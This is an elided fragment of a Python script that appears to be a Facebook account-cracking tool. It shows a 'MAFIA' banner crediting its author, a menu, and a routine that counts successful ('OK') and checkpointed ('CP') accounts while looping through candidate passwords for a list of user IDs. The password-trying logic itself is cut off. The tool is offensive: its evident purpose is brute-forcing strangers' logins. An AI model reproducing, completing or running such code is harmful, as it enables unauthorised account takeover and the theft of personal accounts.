...
==================================================
           CODED BY : SIAM HOSSEN       
           FACEBOOK : SIAM HOSSEN
           GITHUB  : SIAMVAU69
==================================================           
\x1b[0;91m\x1b[1;43m                  M4F1A TH3 BR4ND :)                 \x1b[0m"""
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    input("\x1b[1;97mPress enter to back MAFIA Menu ")
	    mohsin()
...
def mohsin():
    ...
    print(' [2] KNOW ABOUT [SIAM HOSSEN]')
    print(' [E] exit ')
    print('')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;32m[CRACKING MAFIA] {loop} >o< {len(self.id)} [OK][{len(ok)}] >×< [CP][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
